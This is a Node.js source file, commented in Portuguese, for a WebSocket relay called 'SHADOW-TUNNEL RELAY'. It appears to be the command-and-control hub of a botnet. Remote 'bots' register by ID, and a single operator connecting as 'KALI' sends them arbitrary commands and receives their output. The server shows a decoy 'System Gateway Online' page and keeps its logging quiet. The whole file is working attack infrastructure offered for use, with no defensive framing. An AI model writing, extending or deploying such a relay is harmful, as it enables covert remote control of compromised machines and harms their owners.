// ---------- SHADOW-TUNNEL RELAY v12.5 (Monitorado) ---------- //
const WebSocket = require('ws');
const http = require('http');

const server = http.createServer((_, res) => {
    res.writeHead(200);
    res.end('System Gateway v12.5 Online');
});

const wss = new WebSocket.Server({ server });

let KALI = null;
const BOTS = new Map();

// Função para centralizar logs e facilitar o debug no Render
function sysLog(msg) {
    const time = new Date().toLocaleTimeString();
    console.log(`[${time}] ${msg}`);
}

function rawSend(ws, data) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(data);
    }
}

wss.on('connection', (ws, req) => {
    const urlParams = new URLSearchParams(req.url.split('?')[1]);
    const id = urlParams.get('id');

    if (!id) {
        sysLog("Conexão rejeitada: Sem ID.");
        return ws.close(1008);
    }

    if (id === 'KALI') {
        if (KALI) {
            sysLog("Substituindo operador KALI antigo...");
            KALI.close();
        }
        KALI = ws;
        sysLog("Operador DAVID (KALI) autenticado com sucesso.");
        
        // Sincroniza bots ativos imediatamente
        BOTS.forEach((_, botId) => {
            rawSend(KALI, JSON.stringify({ t: 'bot', s: 'on', id: botId }));
        });
    } else {
        BOTS.set(id, ws);
        sysLog(`Bot registrado: ${id}`);
        if (KALI) rawSend(KALI, JSON.stringify({ t: 'bot', s: 'on', id: id }));
    }

    ws.on('message', (raw) => {
        try {
            if (ws === KALI) {
                const d = JSON.parse(raw);
                const target = BOTS.get(d.to);
                if (target) {
                    // Log silencioso: Apenas o comando enviado
                    rawSend(target, d.cmd);
                }
            } else {
                // Tráfego vindo do BOT para o OPERADOR
                if (KALI && KALI.readyState === WebSocket.OPEN) {
                    const payloadSize = (raw.toString().length / 1024).toFixed(2);
                    // sysLog(`Tráfego: Bot [${id}] -> Operador (${payloadSize} KB)`);
                    KALI.send(JSON.stringify({ t: 'res', f: id, d: raw.toString() }));
                }
            }
        } catch (e) {
            sysLog(`Erro no processamento de pacote: ${e.message}`);
        }
    });

    ws.on('close', () => {
        if (ws === KALI) {
            KALI = null;
            sysLog("Operador KALI desconectado.");
        } else {
            BOTS.delete(id);
            sysLog(`Bot offline: ${id}`);
            if (KALI) rawSend(KALI, JSON.stringify({ t: 'bot', s: 'off', id: id }));
        }
    });

    // Manutenção de conexão (Heartbeat)
    const heartbeat = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.ping();
        } else {
            clearInterval(heartbeat);
        }
    }, 25000);
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => sysLog(`Servidor Relay rodando na porta ${PORT}`));
